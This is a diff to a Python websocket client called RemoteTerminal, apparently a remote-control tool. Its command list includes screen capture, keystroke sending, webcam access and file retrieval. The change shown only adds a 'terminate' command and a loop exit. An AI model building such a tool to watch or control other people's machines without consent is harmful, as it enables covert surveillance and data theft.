@@ -16,7 +16,7 @@ import cv2
 class RemoteTerminal:
     def __init__(self):
         self.commands = [
-            'getScreen', 'sendKeys', 'getWebcam', 'getFile', 'cmdList'
+            'getScreen', 'sendKeys', 'getWebcam', 'getFile', 'terminate', 'cmdList'
         ]
         self.ws = None
 
@@ -133,6 +133,14 @@ class RemoteTerminal:
             'content': 'File URL: ' + response.text
         }
 
+    
+    # --- Terminate and shutting down ---
+    async def terminate(self, *args) -> dict:
+        return {
+            'type': 'text',
+            'content': 'Disconnected'
+        }
+
 
     # --- storing UUID ---
     def generate_uuid(self) -> str:
@@ -167,9 +175,11 @@ async def run_terminal():
             cmd = await websocket.recv()
             print(cmd)
             cmd_out = await term.exe_cmd(cmd)
-            print(cmd_out)
-            await asyncio.sleep(1)
+            await asyncio.sleep(.5)
             await websocket.send(json.dumps(cmd_out))
+            
+            if cmd_out['content'] == 'Disconnected':
+                break
 
 
 if __name__ == "__main__":
